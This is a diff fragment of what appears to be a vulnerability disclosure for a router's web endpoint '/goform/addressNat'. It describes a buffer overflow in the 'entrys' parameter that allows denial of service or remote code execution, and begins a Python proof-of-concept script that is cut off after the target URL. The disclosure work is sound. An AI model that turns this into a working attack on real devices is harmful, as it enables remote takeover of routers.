@@ -9,7 +9,7 @@ In function `fromAddressNat` it reads 2 user provided parameters `entrys` and `m
 So by requesting the page `/goform/addressNat`, the attacker can easily perform a **Deny of Service Attack** or **Remote Code Execution** with carefully crafted overflow data.
 ## POC
 ```
-mport requests
+import requests
 
 IP = "10.10.10.1"
 url = f"http://{IP}/goform/addressNat?"
